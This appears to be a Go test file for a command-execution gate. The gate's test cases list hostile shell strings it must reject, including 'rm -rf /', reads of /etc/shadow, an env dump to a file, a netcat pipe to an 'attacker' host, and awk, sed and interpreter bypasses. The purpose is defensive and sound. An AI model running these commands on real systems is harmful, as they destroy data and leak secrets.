package api

import "testing"

// TestContainsDangerousShellChars locks down the attack classes the
// Keeper execution gate is supposed to reject. Each case names the
// bypass technique it is defending against so a future regression
// (e.g. "why did we block awk?") has in-file documentation.
func TestContainsDangerousShellChars(t *testing.T) {
	cases := []struct {
		name   string
		cmd    string
		reject bool
	}{
		// --- safe commands --------------------------------------------
		{"simple curl", `curl https://api.example.com/v1/things`, false},
		{"curl with header value", `curl -H 'Authorization: Bearer $TOKEN' https://x.test`, false},
		{"git clone with tab-separated flag", "git\tclone\thttps://github.com/a/b", false},
		{"argument with single-quoted pipe", `echo 'a|b'`, false},
		{"argument with single-quoted semicolon", `echo 'a;b'`, false},

		// --- metachars OUTSIDE quotes (classic injection) -------------
		{"semicolon chain", `ls; rm -rf /`, true},
		{"pipe to cat", `curl x | cat`, true},
		{"redirect to file", `env > /tmp/leak`, true},
		{"backtick command substitution", "echo `whoami`", true},
		{"dollar-paren command substitution", `echo $(whoami)`, true},
		{"parameter brace expansion", `echo ${PWD}`, true},
		{"logical AND", `true && cat /etc/shadow`, true},
		{"logical OR", `false || cat /etc/shadow`, true},

		// --- interpreter re-invocation --------------------------------
		{"bash -c with pipe inside quotes", `bash -c 'id | nc attacker 9000'`, true},
		{"python -c payload", `python -c 'import os;os.system("id")'`, true},
		{"python3 -c payload", `python3 -c 'print(1)'`, true},
		{"perl -e payload", `perl -e 'system("id")'`, true},
		{"node --eval payload", `node --eval 'process.exit(0)'`, true},

		// --- awk / sed bypass -----------------------------------------
		{"awk system()", `awk 'BEGIN{system("id")}'`, true},
		{"gawk system()", `gawk 'BEGIN{system("id")}'`, true},
		{"sed /e flag", `sed 's/a/b/e' file`, true},

		// --- control characters ---------------------------------------
		{"embedded newline", "ls\nrm -rf /", true},
		{"embedded carriage return", "ls\rcat /etc/passwd", true},
		{"NUL byte", "ls\x00cat", true},
		{"unicode line separator", "ls\u2028cat", true},
		{"unicode paragraph separator", "ls\u2029cat", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := containsDangerousShellChars(tc.cmd)
			if got != tc.reject {
				verdict := "safe"
				if tc.reject {
					verdict = "reject"
				}
				t.Errorf("containsDangerousShellChars(%q) = %v; want %s", tc.cmd, got, verdict)
			}
		})
	}
}

func TestReverseString(t *testing.T) {
	cases := []struct {
		in, want string
	}{
		{"", ""},
		{"a", "a"},
		{"abc", "cba"},
		{"áčď", "ďčá"},         // multi-byte UTF-8
		{"abc def", "fed cba"}, // embedded space
		{"a🙂b", "b🙂a"},         // 4-byte UTF-8 rune survives
	}
	for _, tc := range cases {
		if got := reverseString(tc.in); got != tc.want {
			t.Errorf("reverseString(%q) = %q; want %q", tc.in, got, tc.want)
		}
	}
}

func TestNullIfEmpty(t *testing.T) {
	if got := nullIfEmpty(""); got != nil {
		t.Errorf("nullIfEmpty(\"\") = %v; want nil", got)
	}
	s := "hello"
	got := nullIfEmpty(s)
	if got == nil || *got != s {
		t.Errorf("nullIfEmpty(%q) = %v; want pointer to %q", s, got, s)
	}
}

func TestEnvVarNamePattern(t *testing.T) {
	cases := []struct {
		in    string
		valid bool
	}{
		{"FOO", true},
		{"_FOO", true},
		{"FOO_BAR", true},
		{"foo123", true},
		{"", false},
		{"1FOO", false},    // leading digit
		{"FOO-BAR", false}, // dash
		{"FOO BAR", false}, // space
		{"FOO=1", false},   // equals sign
		{"FOO$", false},    // metachar
	}
	for _, tc := range cases {
		got := envVarNamePattern.MatchString(tc.in)
		if got != tc.valid {
			t.Errorf("envVarNamePattern.MatchString(%q) = %v; want %v", tc.in, got, tc.valid)
		}
	}
}
